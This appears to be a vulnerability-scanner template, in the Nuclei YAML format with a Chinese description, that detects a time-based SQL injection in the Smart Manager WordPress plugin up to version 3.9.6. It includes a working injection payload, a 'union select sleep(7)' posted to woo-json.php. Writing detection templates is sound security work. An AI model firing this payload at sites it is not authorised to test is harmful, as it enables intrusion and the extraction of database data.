id: wp-smart-manager-sqli

info:
  name: Smart Manager for WooCommerce & WPeC <= 3.9.6 - SQL 注入漏洞
  author: r3Y3r53
  severity: critical
  description: |
    该模板用于检测 Smart Manager for WooCommerce & WPeC <= 3.9.6 - SQL 注入漏洞。该类漏洞通常源于接口将用户可控参数直接拼接进 SQL 语句，导致查询语义被篡改。模板会向 `/wp-content/plugins/smart-manager-for-wp-e-commerce/readme.txt` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可通过注入参数读取、篡改或删除数据库中的敏感数据。
    - 在数据库权限过高或支持危险函数的场景下，SQL 注入还可能导致认证绕过、文件读写或进一步执行系统命令。
  remediation: |
    - 对所有数据库访问使用参数化查询或安全 ORM，避免拼接用户可控输入。
    - 对受影响接口的参数进行类型、长度和取值范围校验，并关闭详细数据库错误回显。
    - 使用最小权限数据库账号，排查异常查询、数据导出和新增账号记录。
  reference:
    - https://wpscan.com/vulnerability/e060fbff-792f-4fb5-baa5-82d80240ec99
    - http://cinu.pl/research/wp-plugins/mail_0666ceeca20683907bf82514e8f93e0f.html
    - https://wordpress.org/plugins/smart-manager-for-wp-e-commerce/
  classification:
    cwe-id: CWE-89
  metadata:
    verified: true
    max-request: 2
    publicwww-query: "/wp-content/plugins/smart-manager-for-wp-e-commerce/"
  tags: time-based-sqli,wpscan,wordpress,wp-plugin,smart-manager-for-wp-e-commerce,sqli,vuln

http:
  - raw:
      - |
        GET /wp-content/plugins/smart-manager-for-wp-e-commerce/readme.txt HTTP/1.1
        Host: {{Hostname}}
      - |
        @timeout: 15s
        POST /wp-content/plugins/smart-manager-for-wp-e-commerce/sm/woo-json.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        cmd=saveData&edited=%5B%7B%22id%22%3A%22+1%29+union+select+sleep%287%29%2C2%3B+--+%22%7D%5D

    matchers:
      - type: dsl
        dsl:
          - 'duration_2>=7'
          - 'status_code_2 == 500'
          - 'contains(body_1, "Smart Manager for e-Commerce")'
          - 'contains(body_2, "rel=\"preconnect") || contains(body, "Error</title>")'
        condition: and
